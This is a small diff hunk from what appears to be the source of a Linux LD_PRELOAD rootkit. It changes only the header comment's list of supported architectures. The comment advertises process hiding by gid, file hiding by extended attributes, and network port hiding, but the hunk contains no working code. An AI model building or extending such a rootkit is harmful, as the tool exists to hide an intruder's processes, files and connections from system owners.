@@ -7,7 +7,7 @@
  *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║   
  *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
  *                                           
- *  LD_PRELOAD rootkit for x86_64, i686 and ARM architectures
+ *  LD_PRELOAD rootkit for x86, x86_64, and ARM architectures
  *  complete with gid based process hiding,
  *                xattr based file hiding,
  *                network port hiding,
